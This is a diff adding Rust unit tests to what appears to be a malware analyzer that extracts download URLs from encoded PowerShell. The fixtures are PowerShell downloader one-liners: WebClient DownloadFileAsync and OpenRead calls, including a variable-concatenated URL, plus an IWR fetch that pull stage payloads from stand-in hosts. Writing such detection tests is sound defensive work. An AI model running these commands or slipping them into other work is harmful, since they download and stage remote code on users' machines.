@@ -10095,6 +10095,43 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn webclient_downloadfileasync_preserves_destination() {
+        let ps = r#"$wc=New-Object Net.WebClient;$wc.DownloadFileAsync("https://async-webclient.example/stage.exe","C:\Users\Public\stage.exe")"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://async-webclient.example/stage.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\stage.exe")
+            )
+        });
+        assert!(
+            has,
+            "DownloadFileAsync destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn webclient_openread_concatenated_variable_url_extracted() {
+        let ps = r#"$ser=$('http://198.51.100.7:8080');$t='/stage.bin';$wc=New-Object Net.WebClient;$wc.OpenRead($Ser+$T)"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let expected = "http://198.51.100.7:8080/stage.bin";
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == expected
+            )
+        });
+        assert!(
+            has,
+            "no Download trait for concatenated OpenRead URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_positional_url_after_flags_extracted() {
         let ps = r#"IWR -useb 'https://iwr.example/payload.js' -outf $env:TEMP\payload.js"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
